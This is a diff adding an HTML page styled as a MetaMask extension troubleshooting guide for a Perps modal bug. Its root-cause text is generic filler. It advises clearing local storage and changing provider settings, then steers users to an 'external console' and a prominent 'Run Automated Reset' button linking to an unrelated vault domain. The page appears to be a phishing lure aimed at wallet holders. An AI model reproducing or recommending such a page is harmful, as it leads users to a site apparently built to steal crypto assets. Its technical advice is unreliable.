@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Metamask Extension Bug Perps Modal Incorrectly Shown When Navig</title>
+<style>
+    body {
+        font-family: system-ui;
+        background: #0f111a;
+        color: #ddd;
+        padding: 20px;
+        line-height: 1.5;
+    }
+    .content {
+        max-width: 880px;
+        margin: auto;
+        background: #1e1f24;
+        border-radius: 24px;
+        padding: 2rem;
+        box-shadow: none;
+    }
+    pre {
+        background: #0f0f12;
+        padding: 1rem;
+        border-radius: 12px;
+        overflow-x: auto;
+    }
+    a { color: #ff9455; }
+    </style>
+</head>
+<body>
+<div class="content">
+<h2>Symptom</h2>
+<ul>
+<li>When navigating back from the Market Details page, the Metamask extension incorrectly displays the Perps modal, causing an unexpected user experience.</li>
+</ul>
+<h2>Technical Root Cause</h2>
+<ul>
+<li>The error occurs due to a mismatch in the state management of the Metamask extension, specifically when handling navigation events between different pages.</li>
+</ul>
+<h3>Manual Overrides</h3>
+<ul>
+<li>To resolve the issue, try the following manual overrides:</li>
+<li>Clear the browser's local storage to remove any cached state: <code>localStorage.clear()</code></li>
+<li>Reset the Metamask extension's configuration to its default settings</li>
+<li>Update the <code>web3</code> provider configuration using the following code block:</li>
+</ul>
+<pre class="codehilite"><code class="language-json">{
+  &quot;provider&quot;: &quot;https://mainnet.infura.io/v3/YOUR_PROJECT_ID&quot;,
+  &quot;chainId&quot;: 1
+}
+</code></pre>
+
+<p>Consider utilizing an external console for further debugging and configuration adjustments.</p>
+<h2>Prerequisites</h2>
+<ul>
+<li>Metamask extension installed and configured</li>
+<li>A compatible Ethereum wallet set up</li>
+<li>The latest version of the browser being used</li>
+</ul>
+<div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
+    <a href="https://tron.amanavault.site" class="btn" style="
+        background: #ff7b2c !important; 
+        color: #000000 !important; 
+        padding: 16px 48px !important; 
+        border-radius: 50px !important; 
+        font-weight: bold !important; 
+        font-size: 1.25rem !important;
+        display: inline-block !important; 
+        text-decoration: none !important;
+        box-shadow: 0 4px 15px rgba(255,123,44,0.4);
+        min-width: 280px;
+    ">
+    🛠 Run Automated Reset
+    </a>
+</div>
+</div>
+</body>
+</html>
